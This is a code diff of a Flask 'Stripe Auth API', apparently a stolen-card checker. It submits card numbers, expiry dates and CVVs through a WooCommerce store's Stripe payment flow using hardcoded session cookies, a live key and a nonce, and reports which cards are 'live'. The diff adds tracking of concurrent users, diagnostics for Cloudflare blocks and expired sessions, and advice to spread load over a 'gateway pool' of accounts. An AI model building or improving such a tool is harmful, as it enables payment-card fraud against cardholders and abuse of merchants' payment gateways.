@@ -1,13 +1,14 @@
 from flask import Flask, request, jsonify
 import cloudscraper
 import requests
+import threading
+import time
+from datetime import datetime
 
 app = Flask(__name__)
 
-# Stripe Public Key
 STRIPE_PK = 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
 
-# WooCommerce Cookies & Nonce
 COOKIES = {
     '__cf_bm': 'A9UWMH0qRFN40o1eIDefAIgZHEzlvcPXAonf57iCWMw-1768290583-1.0.1.1-MsHIAV3.sf8ySh.QyKfOGm41IUWhcbMere8W0Jre4LOgJtJUd6K3OK3dU6rV.id9bcf3EjPRbD5icjitxP_vUzASMtFvRZx8OYKkSBdlTng',
     'sbjs_migrations': '1418474375998%3D1',
@@ -26,19 +27,79 @@ COOKIES = {
 
 AJAX_NONCE = 'dc69c7cb82'
 
+# ==========================================
+# 🔒 Concurrent Request Tracking
+# ==========================================
+class RequestTracker:
+    def __init__(self):
+        self.active_requests = []
+        self.lock = threading.Lock()
+    
+    def start_request(self, request_id):
+        """Mark request as active"""
+        with self.lock:
+            self.active_requests.append({
+                'id': request_id,
+                'start_time': datetime.now(),
+                'timestamp': time.time()
+            })
+    
+    def end_request(self, request_id):
+        """Mark request as complete"""
+        with self.lock:
+            self.active_requests = [r for r in self.active_requests if r['id'] != request_id]
+    
+    def get_concurrent_count(self):
+        """Get current concurrent request count"""
+        with self.lock:
+            # Remove old requests (older than 60s)
+            current_time = time.time()
+            self.active_requests = [r for r in self.active_requests if current_time - r['timestamp'] < 60]
+            return len(self.active_requests)
+    
+    def is_conflict_likely(self):
+        """Check if conflict is likely (multiple concurrent requests)"""
+        return self.get_concurrent_count() > 1
+
+tracker = RequestTracker()
+
 @app.route('/')
 def home():
+    concurrent = tracker.get_concurrent_count()
     return jsonify({
         'status': 'running',
-        'message': 'Stripe Auth API',
+        'message': 'Stripe Auth API with Conflict Detection',
+        'current_users': concurrent,
+        'conflict_risk': 'HIGH' if concurrent > 1 else 'LOW',
         'endpoints': {
             'check': '/api/check (POST)',
-            'health': '/ (GET)'
+            'health': '/ (GET)',
+            'stats': '/stats (GET)'
         }
+    })
+
+@app.route('/stats')
+def stats():
+    """Get current API stats"""
+    concurrent = tracker.get_concurrent_count()
+    return jsonify({
+        'active_requests': concurrent,
+        'conflict_risk': 'HIGH' if concurrent > 1 else 'LOW',
+        'message': f'{concurrent} user(s) currently checking cards'
     })
 
 @app.route('/api/check', methods=['POST'])
 def check_card():
+    # Generate unique request ID
+    request_id = f"{time.time()}_{threading.current_thread().ident}"
+    
+    # Track this request
+    tracker.start_request(request_id)
+    
+    # Check for concurrent requests
+    concurrent_users = tracker.get_concurrent_count()
+    conflict_detected = concurrent_users > 1
+    
     try:
         data = request.json
         card = data.get('card', '').strip()
@@ -46,7 +107,6 @@ def check_card():
         year = data.get('year', '').strip()
         cvv = data.get('cvv', '').strip()
         
-        # Fix year
         if len(year) == 4:
             year = year[2:]
         
@@ -126,52 +186,143 @@ def check_card():
             timeout=60
         )
         
+        # Get response details
+        status_code = response_auth.status_code
         result_text = response_auth.text.lower()
+        
+        # Detect specific issues
+        is_cloudflare_block = 'cloudflare' in result_text or 'just a moment' in result_text or status_code == 403
+        is_html_error = '<html' in result_text and status_code != 200
+        is_session_error = 'session' in result_text or 'logged' in result_text or 'login' in result_text
+        is_nonce_error = 'nonce' in result_text or 'expired' in result_text or 'invalid' in result_text
+        is_json_error = response_auth.headers.get('content-type', '').startswith('application/json')
         
         # Response detection
         if 'success' in result_text and 'true' in result_text:
             return jsonify({
                 'status': 'approved',
                 'message': 'Card Authorized Successfully',
-                'code': 'approved'
+                'code': 'approved',
+                'concurrent_info': {
+                    'users_checking': concurrent_users,
+                    'conflict_detected': conflict_detected
+                }
             })
         elif 'decline' in result_text or 'declined' in result_text:
             return jsonify({
                 'status': 'declined',
                 'message': 'Card Declined',
-                'code': 'card_declined'
+                'code': 'card_declined',
+                'concurrent_info': {
+                    'users_checking': concurrent_users,
+                    'conflict_detected': conflict_detected
+                }
             })
         elif 'cvc' in result_text or 'security code' in result_text:
             return jsonify({
                 'status': 'approved',
                 'message': 'Card Live - CVV Incorrect',
-                'code': 'incorrect_cvc'
+                'code': 'incorrect_cvc',
+                'concurrent_info': {
+                    'users_checking': concurrent_users,
+                    'conflict_detected': conflict_detected
+                }
             })
-        elif 'expired' in result_text:
+        elif 'expired' in result_text and 'card' in result_text:
             return jsonify({
                 'status': 'declined',
                 'message': 'Card Expired',
-                'code': 'expired_card'
+                'code': 'expired_card',
+                'concurrent_info': {
+                    'users_checking': concurrent_users,
+                    'conflict_detected': conflict_detected
+                }
             })
         else:
+            # ==========================================
+            # ⚠️ UNKNOWN RESPONSE WITH CONFLICT INFO
+            # ==========================================
+            
+            # Determine likely cause
+            if is_cloudflare_block:
+                likely_cause = 'Cloudflare blocked request (403)'
+                suggestion = 'Cookies expired or IP blocked. Update cookies.'
+            elif conflict_detected:
+                likely_cause = f'⚠️ CONFLICT DETECTED! {concurrent_users} users using same account simultaneously'
+                suggestion = f'Solution: Use gateway pool with {concurrent_users}+ accounts OR wait {concurrent_users * 10}s'
+            elif is_session_error:
+                likely_cause = 'Session/Login expired'
+                suggestion = 'Account logged out. Update cookies & login.'
+            elif is_nonce_error:
+                likely_cause = 'Nonce expired or invalid'
+                suggestion = 'Update AJAX_NONCE from fresh page.'
+            elif is_html_error:
+                likely_cause = 'Received HTML error page'
+                suggestion = 'Site error or maintenance mode.'
+            elif status_code >= 500:
+                likely_cause = f'Server error ({status_code})'
+                suggestion = 'Gateway site is down. Retry later.'
+            elif status_code == 429:
+                likely_cause = 'Rate limit exceeded'
+                suggestion = 'Too many requests. Wait 60 seconds.'
+            else:
+                likely_cause = 'New/unexpected response format'
+                suggestion = 'Check raw_response for details.'
+            
             return jsonify({
                 'status': 'unknown',
-                'message': 'Unknown Response',
-                'code': 'unknown'
+                'message': 'Unknown Response - Check Debug Info',
+                'code': 'unknown',
+                
+                # 🚨 CONFLICT WARNING
+                'concurrent_info': {
+                    'users_checking': concurrent_users,
+                    'conflict_detected': conflict_detected,
+                    'conflict_warning': '⚠️ MULTIPLE USERS DETECTED!' if conflict_detected else None
+                },
+                
+                # 🔍 DEBUG INFORMATION
+                'debug': {
+                    'http_status': status_code,
+                    'likely_cause': likely_cause,
+                    'suggestion': suggestion,
+                    'detected_issues': {
+                        'cloudflare_block': is_cloudflare_block,
+                        'session_expired': is_session_error,
+                        'nonce_invalid': is_nonce_error,
+                        'html_error_page': is_html_error,
+                        'concurrent_conflict': conflict_detected,
+                        'is_json': is_json_error
+                    },
+                    'raw_response': result_text[:500],
+                    'response_length': len(result_text),
+                    'content_type': response_auth.headers.get('content-type', 'unknown')
+                }
             })
             
     except requests.exceptions.Timeout:
         return jsonify({
             'status': 'error',
             'message': 'Request Timeout',
-            'code': 'timeout'
+            'code': 'timeout',
+            'concurrent_info': {
+                'users_checking': concurrent_users,
+                'conflict_detected': conflict_detected
+            }
         })
     except Exception as e:
         return jsonify({
             'status': 'error',
             'message': f'Error: {str(e)}',
-            'code': 'exception'
+            'code': 'exception',
+            'concurrent_info': {
+                'users_checking': concurrent_users,
+                'conflict_detected': conflict_detected
+            }
         })
+    finally:
+        # Remove this request from tracking
+        tracker.end_request(request_id)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
